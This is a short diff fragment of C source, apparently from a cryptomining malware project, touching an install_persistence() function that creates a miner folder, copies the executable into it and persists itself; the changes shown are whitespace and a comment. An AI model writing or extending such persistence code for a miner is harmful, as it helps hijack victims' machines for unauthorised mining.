@@ -179,14 +179,15 @@ void install_persistence(){
     /* Create folder and copy malware to it */
     if(create_cryptomining_folder()){
         copy_executable_to_folder();
-    }else{
-        
+    
+    }else{    
         FILE *f = fopen(executable_path, "rb");
         if(f == NULL){
             copy_executable_to_folder();
         }
     }
-
+    
+    /* Continue virus inside his directory */
     chdir(miner_path);
 
     /* Persist the malware */
